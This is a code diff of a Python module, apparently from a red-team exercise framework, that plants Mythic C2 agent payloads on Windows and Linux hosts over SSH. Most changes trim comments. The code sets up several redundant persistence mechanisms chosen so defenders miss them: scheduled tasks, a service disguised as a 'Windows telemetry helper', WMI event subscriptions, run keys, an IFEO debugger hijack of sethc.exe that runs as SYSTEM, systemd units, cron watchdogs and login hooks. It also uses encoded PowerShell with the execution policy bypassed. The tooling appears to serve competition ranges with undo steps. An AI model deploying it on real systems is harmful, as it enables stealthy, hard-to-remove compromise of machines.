@@ -8,23 +8,16 @@ from pathlib import Path
 
 from ..errors import C2Error
 
-from . import FakeMythic  # noqa: F401  (re-exported convenience for callers)
+from . import FakeMythic  # noqa: F401
 
 MANIFEST_REL = Path("red/payloads/manifest.json")
 
-# Windows persistence surfaces. A plant draws ONE launcher (something that puts
-# the agent on the box now) and one or two redundant mechanisms from other
-# surfaces, so a defender has to sweep several places and killing one leaves the
-# channel up. A single ONSTART task is a one-look IOC.
+# A launcher starts the agent now; a redundancy revives it after a kill.
+# Surfaces that do both appear in both tuples.
 WINDOWS_LAUNCHERS = ("task_onstart", "task_onlogon", "task_daily", "service",
                      "wmi", "run_key", "startup", "active_setup")
 WINDOWS_REDUNDANCY = ("run_key", "startup", "ifeo", "active_setup", "wmi")
-
-# Linux gets the same treatment: the systemd unit is the primary surface and
-# one redundant surface is drawn alongside it, so killing the unit does not
-# end the channel.
 LINUX_REDUNDANCY = ("cron_watch", "profile_hook")
-
 
 
 def manifest_path(comp_dir):
@@ -32,7 +25,6 @@ def manifest_path(comp_dir):
 
 
 def load_manifest(comp_dir):
-    """The frozen payload manifest, or {} when comp-prep has not run."""
     path = manifest_path(comp_dir)
     if not path.exists():
         return {}
@@ -43,8 +35,7 @@ def load_manifest(comp_dir):
 
 
 def manifest_entry(manifest, box_id, transport=None):
-    """The box's frozen payload; comp-prep keys the manifest `<box>:<transport>`, so a
-    caller that knows only the box falls back to its first entry."""
+    """comp-prep keys the manifest by `<box>:<transport>`."""
     boxes = (manifest or {}).get("boxes") or {}
     if box_id in boxes:
         return boxes[box_id]
@@ -65,7 +56,6 @@ def payload_file(comp_dir, entry):
 
 
 def _schtasks_status(output):
-    """The `Status:` value of a `schtasks /Query /FO LIST` body ("" when absent)."""
     for line in (output or "").splitlines():
         if line.strip().lower().startswith("status:"):
             return line.split(":", 1)[1].strip()
@@ -73,24 +63,14 @@ def _schtasks_status(output):
 
 
 class Planter:
-    """Installs frozen payloads. Uses only ctx.ssh + ctx.c2 (+ ctx.world to note)."""
-
     def __init__(self, ctx, comp_dir=None, manifest=None, now=None):
         self.ctx = ctx
         self.comp_dir = comp_dir or (ctx.cfg["run"].get("comp_dir") or ".")
         self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
         self._now = now or time.time
 
-    # -- install ------------------------------------------------------------
-
     def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
-        """Install the frozen payload for `box_id` and report both facts.
-
-        The callback window is config (`c2.callback_wait_sec`, 120s): a freshly
-        installed Mythic takes MINUTES for the first agent check-in, and the old
-        45s default reported "no callback" on every box of the 2026-10-18 scrim
-        while all six channels were live two minutes later.
-        """
+        """The callback window is 120s because a freshly installed Mythic takes minutes to check in."""
         if wait_sec is None:
             wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
         os_name = os_name or self.ctx.os_of(ip)
@@ -129,9 +109,8 @@ class Planter:
         stage = f"/tmp/{names_drawn['stem']}"
         remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}"
         unit_path = f"/etc/systemd/system/{unit}"
-        # The escalation the seed proved (or a root foothold). Every privileged
-        # install step rides it; a sudo refusal means the seed chose the wrong
-        # label, not that the install should try sudo anyway.
+        # Every privileged step rides the escalation the seed proved (or a root
+        # foothold); a sudo refusal means the label was wrong, never a retry without it.
         label = fh.get("escalation") or fh.get("kind") or "?"
         rc, _out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                         f"mkdir -p {stage}", timeout=60,
@@ -151,15 +130,15 @@ class Planter:
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                   f"{stage}/{box_id}", mode=0o755,
                                   key_path=fh.get("key_path"))
-            # The unit is generated here, so it rides sftp like the payload: a
-            # heredoc cannot repeat a non-sudo command through an escape label.
+            # The unit rides sftp like the payload: a heredoc cannot repeat a
+            # non-sudo command through an escape label.
             with tempfile.NamedTemporaryFile("w", encoding="utf-8") as staged_unit:
                 staged_unit.write(unit_text)
                 staged_unit.flush()
                 self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
                                       staged_unit.name, f"{stage}/{unit}",
                                       mode=0o644, key_path=fh.get("key_path"))
-        except Exception as exc:                       # transport blowups are data
+        except Exception as exc:
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
         privileged = (
@@ -204,15 +183,6 @@ class Planter:
                 "check_cmd": f"systemctl is-active {unit}"}
 
     def _linux_redundant(self, ip, fh, drawn, remote, stage):
-        """Persistence surfaces beyond the systemd unit.
-
-        A lone unit is the first grep a defender runs. A cron file (boot + a
-        17-minute watchdog) or a login hook brings the agent back after the unit
-        is killed, and blue has to sweep a second location. With
-        `c2.implant_spread: full` BOTH are planted — the coverage mode the QA runs
-        use. Best effort either way: the unit is the primary surface, so this only
-        ever adds a note.
-        """
         from ..effects.base import root_cmd        # lazy: avoids a cycle
         NL = chr(10)
         c2 = (self.ctx.cfg or {}).get("c2") or {}
@@ -254,7 +224,7 @@ class Planter:
                     undo.append("systemctl try-restart cron 2>/dev/null || true")
                 notes.append(mech + " at " + path + " rc=0" if rc == 0 else
                              mech + " rc=" + str(rc) + ": " + (err or out).strip()[:120])
-            except Exception as exc:                       # redundancy is optional
+            except Exception as exc:
                 notes.append(mech + " failed: " + str(exc))
             finally:
                 if local and os.path.exists(local):
@@ -262,18 +232,6 @@ class Planter:
         return chosen, paths, undo, "; ".join(notes)
 
     def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
-        """Plant the frozen payload through a mix of Windows mechanisms.
-
-        One ONSTART task is an IOC: blue finds it once and the whole board is
-        clean in a minute. Each plant therefore draws a LAUNCHER that starts the
-        agent now, plus one or two REDUNDANT persistence mechanisms from
-        different surfaces (registry, WMI subscription, IFEO debugger, per-user
-        setup) — so a defender has to know four different places to look, and
-        killing one leaves the channel alive.
-
-        The process is the proof: whatever the mechanisms report, the install is
-        only ok when the payload image is running on the box.
-        """
         from ..effects import artifactnames as names
         fh = self.ctx.world.foothold(ip)
         if not fh:
@@ -284,8 +242,6 @@ class Planter:
         full_spread = (str(((self.ctx.cfg or {}).get("c2") or {})
                            .get("implant_spread", "draw")).strip().lower() == "full")
         if full_spread:
-            # Coverage/QA mode: every surface on this box, so a run proves each
-            # implant path instead of whichever ones the draw happened to pick.
             launcher = WINDOWS_LAUNCHERS[0]
             redundant = list(WINDOWS_LAUNCHERS[1:]) + [
                 m for m in WINDOWS_REDUNDANCY if m not in WINDOWS_LAUNCHERS]
@@ -303,7 +259,7 @@ class Planter:
                               f'Directory -Force -Path \'{remote_dir}\' | Out-Null"')
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                   staged, key_path=fh.get("key_path"))
-        except Exception as exc:                       # transport blowups are data
+        except Exception as exc:
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
 
@@ -315,10 +271,8 @@ class Planter:
         for mechanism in [launcher] + redundant:
             names_i = drawn
             if full_spread:
-                # Each surface registers under its own drawn names: three task
-                # triggers sharing one task name would overwrite each other, and
-                # one name reused across registry + WMI is a single-lookup IOC.
-                # The payload path (stem) deliberately stays the same.
+                # Fresh drawn names per surface: task triggers sharing one name
+                # would overwrite; the stem stays so all point at one payload.
                 names_i = dict(names.windows_names(self.ctx.world, rng=rng,
                                                    mode=names.mode_from_cfg(self.ctx.cfg)),
                                stem=drawn["stem"])
@@ -327,8 +281,8 @@ class Planter:
             notes.append(f"{mechanism}: {spec['detail']}")
             undo.extend(spec["undo"])
             artifacts.extend(spec["paths"])
-        # The launcher may be passive (a logon trigger, a WMI timer): start the
-        # agent once, detached, so the channel is live inside this seed window.
+        # The launcher may be passive (logon trigger, WMI timer): start the
+        # agent once so the channel is live inside this seed window.
         alive = self._win_process_running(ip, fh, Path(staged).name)
         if not alive:
             self._start_detached(ip, fh, remote)
@@ -346,35 +300,20 @@ class Planter:
                                  f"Remove-Item -Path '{remote}' -Force"],
                 "check_cmd": f'tasklist /FI "IMAGENAME eq {Path(staged).name}"'}
 
-    # -- windows mechanism helpers -------------------------------------------
-
     def _win_ps(self, ip, fh, body, timeout=120):
-        """Run a PowerShell snippet, base64-encoded so no shell layer mangles it.
-
-        Registering a registry value or a WMI consumer with embedded quotes
-        through `cmd /c` lost the value silently (reg add answered 0, the key
-        was never written). -EncodedCommand is a single token: nothing to quote.
-        """
+        """-EncodedCommand is one token: cmd /c quoting silently lost embedded reg/WMI values."""
         import base64
         blob = base64.b64encode(body.encode("utf-16-le")).decode()
         return self._win(ip, fh, f"powershell -NoProfile -ExecutionPolicy Bypass "
                                  f"-EncodedCommand {blob}", timeout=timeout)
 
     def _win(self, ip, fh, command, timeout=120):
-        """Run one cmd/powershell line on a Windows box over its SSH channel."""
         return self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", command,
                                 timeout=timeout, key_path=fh.get("key_path"))
 
     def _start_detached(self, ip, fh, remote):
-        """Start the payload OUTSIDE the SSH session.
-
-        Children of an OpenSSH session are killed with it (ssd's job object takes
-        the tree down when the channel closes), so `start "" /b` proved nothing:
-        the process was there while the plant looked and gone by the next command.
-        Win32_Process.Create spawns under the WMI service — session 0, detached,
-        the same way the scheduled task and the WMI subscription start it.
-        """
-        q = '"'      # the payload path has spaces; CIM wants it quoted
+        """Windows sshd kills its child tree when the session closes; Win32_Process.Create spawns detached under the WMI service."""
+        q = '"'
         body = ("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
                 "-Arguments @{CommandLine='" + q + remote + q + "'} | "
                 "Select-Object -ExpandProperty ReturnValue")
@@ -382,7 +321,6 @@ class Planter:
 
     @staticmethod
     def _why(rc, err, out):
-        """`rc=0` or `rc=1: <the first line PowerShell actually said>`."""
         if rc == 0:
             return "rc=0"
         text = " ".join((err or out or "").split())[:120]
@@ -396,11 +334,8 @@ class Planter:
     def _mech_task(self, ip, fh, drawn, remote, guard=None, *, trigger,
                    mo=None, st=None):
         task = drawn["task"]
-        # A bare /TR starts another copy every time a plant re-registers, and the
-        # live range proved it: ten live copies of one agent on each Windows box,
-        # which is noise rather than persistence. The task runs a stub that
-        # checks for the image first, so all the surfaces coalesce on one
-        # process. (The stub is a file because schtasks mangles a piped /TR.)
+        # The task runs a guard stub, not a bare /TR: every re-registration would
+        # stack another agent copy, and schtasks mangles an inline piped /TR.
         stub = remote.rsplit("\\", 1)[0] + "\\" + task.replace(" ", "") + "-run.cmd"
         body = guard[len("cmd /c "):] if guard else f'start "" /b "{remote}"'
         self._win_ps(ip, fh, f"Set-Content -LiteralPath '{stub}' -Value '{body}' "
@@ -424,16 +359,13 @@ class Planter:
         return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONLOGON")
 
     def _mech_task_daily(self, ip, fh, drawn, remote, guard):
-        # A recurring trigger with a random minute: the agent comes back every
-        # hour without a boot and without a logon.
         minute = self.ctx.rng.randrange(1, 60)
         return self._mech_task(ip, fh, drawn, remote, guard, trigger="MINUTE",
                                mo="60", st=f"00:{minute:02d}")
 
     def _mech_service(self, ip, fh, drawn, remote, guard):
-        # A console agent cannot be an SCM service (1053), so the service runs a
-        # detached launcher; the service entry is the persistence, the child is
-        # the agent. `sc failure` makes a stopped launcher restart itself.
+        # A console agent cannot be an SCM service (1053), so the service wraps
+        # the detached launcher; `sc failure` restarts it if it stops.
         svc = drawn["service"]
         script = (f'sc create "{svc}" binPath= "{guard}" '
                   f'start= auto && sc description "{svc}" "Windows telemetry helper" && '
@@ -444,8 +376,6 @@ class Planter:
                 "undo": [f'sc stop "{svc}"', f'sc delete "{svc}"']}
 
     def _mech_wmi(self, ip, fh, drawn, remote, guard):
-        # Permanent WMI subscription: no file on disk in a startup location, no
-        # task, no service — blue has to enumerate root\subscription to see it.
         name = drawn["wmi"]
         body = (
             f"$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
@@ -493,8 +423,7 @@ class Planter:
                 "undo": [f'Remove-Item -Path \'{cmd}\' -Force']}
 
     def _mech_ifeo(self, ip, fh, drawn, remote, guard):
-        # Debugger hijack on an accessibility binary: the payload starts as SYSTEM
-        # at the logon screen (shift x5), a surface almost nobody checks.
+        # IFEO debugger on sethc.exe: starts as SYSTEM at the logon screen.
         target = "sethc.exe"
         key = (f"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File "
                f"Execution Options\\{target}")
@@ -523,8 +452,7 @@ class Planter:
                 "undo": [f'reg delete "{key}" /f']}
 
     def wait_for_callback(self, box_id, *, wait_sec=45, poll_interval=5):
-        """A callback is a FRESH row (`c2.callback_max_age_sec`), never the mere
-        existence of one: tavern/mythic keep rows after the agent dies."""
+        """tavern/mythic keep callback rows after the agent dies; only a fresh row counts."""
         if self.ctx.c2 is None:
             return False
         deadline = self._now() + max(wait_sec, 0)
@@ -556,8 +484,6 @@ class Planter:
         return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))
 
 
-# Mechanism name -> builder. Each builder registers one persistence surface and
-# returns its own undo, so a plant's restore covers exactly what it touched.
 WINDOWS_MECHANISMS = {
     "task_onstart": Planter._mech_task_onstart,
     "task_onlogon": Planter._mech_task_onlogon,
